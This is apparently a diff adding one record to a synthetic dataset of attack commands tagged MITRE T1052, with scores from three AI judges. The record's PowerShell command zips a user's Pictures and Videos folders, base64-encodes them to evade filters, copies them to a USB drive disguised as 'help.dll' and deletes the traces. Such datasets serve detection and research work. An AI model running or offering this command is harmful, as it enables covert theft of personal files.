@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume -DriveType Removable | Select -First 1 -ExpandProperty DriveLetter)+':\\'; $zip=\"$env:TEMP\\media.zip\"; Compress-Archive -Path \"$env:USERPROFILE\\Pictures\\*\", \"$env:USERPROFILE\\Videos\\*\" -DestinationPath $zip -Force; $b64=\"$env:TEMP\\media.enc\"; [IO.File]::WriteAllText($b64,[Convert]::ToBase64String([IO.File]::ReadAllBytes($zip))); Copy-Item $b64 (Join-Path $usb 'help.dll') -Force; Remove-Item $zip,$b64 -Force",
+  "explanation": "Compresses and base64-encodes media libraries, then writes the encoded file to the USB as a DLL-named decoy using Copy-Item to avoid simple content filters.",
+  "rationale_steps": [
+    "Resolve removable drive",
+    "Compress large directories to a single archive",
+    "Base64-encode to reduce content-based detection",
+    "Copy to USB under a misleading filename using Copy-Item",
+    "Remove local staging files"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-c08dd5d1",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting and valid constructs, though Get-Volume -DriveType may be an invalid parameter in many environments.",
+        "semantic_score": 4,
+        "semantic_justification": "It stages by compressing and base64-encoding media and writes to a removable drive with a deceptive filename (aligning to T1052), but success depends on a potentially invalid -DriveType filter and the presence of a writable removable volume.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T08:12:59.328647Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes/parentheses, correct variable assignments, proper method calls, and appropriate command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by automatically identifying a removable drive, compressing user media files, encoding them to evade detection, copying to the USB with a misleading filename, and cleaning up evidence - all core behaviors of exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:13:02.330726Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax, balanced elements, and valid command parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052, realistically staging, encoding, and exfiltrating user media to a USB drive with a decoy filename, as described by the technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:13:12.818469Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
